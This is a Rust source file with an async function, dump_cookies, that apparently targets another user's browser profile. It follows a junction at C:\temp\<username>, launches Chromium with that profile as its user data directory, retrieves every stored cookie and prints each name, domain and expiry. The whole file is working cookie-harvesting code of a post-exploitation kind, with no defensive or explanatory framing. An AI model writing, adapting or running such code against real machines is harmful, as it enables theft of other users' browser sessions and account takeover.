use std::path::PathBuf;
use futures::StreamExt;
use chromiumoxide::browser::{Browser, BrowserConfig};

pub async fn dump_cookies(username: &str) -> Result<(), Box<dyn std::error::Error>> {
    let junc_path: PathBuf = PathBuf::from(format!("C:\\temp\\{}", username));

    if junction::exists(&junc_path)? {
        let (mut browser, mut handler) = Browser::launch(BrowserConfig::builder()
        .user_data_dir(junc_path)
        .build()?
        ).await?;

        let handle = async_std::task::spawn(async move {
            while let Some(h) = handler.next().await {
                match h {
                    Ok(_) => continue,
                    Err(_) => break,
                }
            }
        });

        let cookies = browser.get_cookies().await?;

        cookies.iter().for_each(|cookie| println!("[>] Name: {}\n    Domain {}\n    Expires: {}", cookie.name, cookie.domain, cookie.expires));

        browser.close().await?;
        browser.wait().await?;
        handle.await;
    }

    Ok(())
}
